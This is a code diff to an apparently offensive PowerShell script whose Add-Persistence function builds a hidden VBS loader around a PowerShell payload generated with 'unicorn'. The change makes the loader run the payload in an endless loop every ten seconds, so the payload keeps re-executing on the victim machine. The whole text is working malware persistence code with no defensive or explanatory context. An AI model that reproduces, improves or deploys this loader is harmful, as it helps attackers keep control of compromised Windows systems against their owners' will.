@@ -48,8 +48,11 @@ function Add-Persistence()
 	
 	# Create the VBS file and insert the powershell command from unicorn.
 	Write-Host "[+] Creating VBS loader."
-	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
+	$vbs = "Do`r`n"
+	$vbs += "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
 	$vbs += "$payload"
+	$vbs += "WScript.Sleep 10000`r`n"
+	$vbs += "Loop"
 	$vbs | Out-File $payloadvbsloaderpath -Force
 	
 	# Mark the file as hidden.
